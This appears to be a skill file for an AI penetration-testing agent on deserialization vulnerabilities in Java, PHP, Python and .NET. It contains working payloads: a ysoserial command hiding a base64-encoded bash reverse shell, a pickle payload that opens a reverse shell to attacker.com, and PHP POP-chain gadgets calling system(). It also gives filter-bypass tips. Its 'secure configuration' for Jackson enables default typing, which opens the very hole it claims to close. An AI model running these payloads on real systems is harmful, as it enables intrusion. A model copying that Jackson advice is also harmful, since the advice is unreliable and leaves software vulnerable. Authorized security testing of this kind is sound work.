---
name: deserialization-testing
description: Professional skills and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

A deserialization vulnerability arises when an application deserializes untrusted data, potentially leading to remote code execution, denial of service, and more. This skill provides methods for detecting, exploiting, and defending against deserialization vulnerabilities.

## How the Vulnerability Works

When an application deserializes serialized data into objects, if the data source is untrusted, an attacker can craft malicious serialized data that executes arbitrary code during the deserialization process.

## Common Formats

### Java

**Common libraries:**
- Java native serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Methods

### 1. Identify Serialized Data

**Java serialization signatures:**
```
AC ED 00 05 (hexadecimal)
rO0 (Base64)
```

**PHP serialization signatures:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle signatures:**
```
\x80\x03
```

### 2. Detect Deserialization Points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cache data
- Message queues

### 3. Java Deserialization

**Exploiting Apache Commons Collections:**
```java
// Generate a payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP Deserialization

**Basic test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic method exploitation:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Using ysoserial:**
```bash
# Generate the payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 encode
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Build a malicious object using a gadget chain
// Refer to the ysoserial source code
```

### PHP RCE

**Exploiting a POP chain:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Encoded: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter Bypass

**Use a different gadget chain:**
- If CommonsCollections is filtered, try Spring
- If one version is filtered, try another version

### Class Name Obfuscation

**Using reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tool Usage

### ysoserial

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generate Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available gadgets
./phpggc -l

# Generate a payload
./phpggc Monolog/RCE1 system id

# Generate an encoded payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept a request containing serialized data
2. Use a plugin to generate a payload
3. Replace the original data
4. Observe the response

## Verification and Reporting

### Verification Steps

1. Confirm you can control the serialized data
2. Verify that deserialization triggers code execution
3. Assess the impact (RCE, data leakage, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record the confirmed vulnerability on the platform (the platform's sole entry point for logging vulnerabilities); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and serialized data format
- The gadget chain or exploitation method used
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, use of safe serialization, etc.)

## Defensive Measures

### Recommended Solutions

1. **Avoid deserializing untrusted data**
   - Use JSON instead
   - Use a safe serialization format

2. **Input validation**
   ```java
   // Allowlist validation of class names
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // Validate the class name
       // ...
   }
   ```

3. **Use secure configuration**
   ```java
   // Jackson configuration
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **Class loader isolation**
   - Use a custom ClassLoader
   - Restrict the classes that can be loaded

5. **Monitoring and logging**
   - Log deserialization operations
   - Monitor for anomalous behavior

## Notes

- Only test in authorized test environments
- Be aware of gadget chain differences across library versions
- Mind payload size limits when testing
- Understand the dependency library versions of the target application
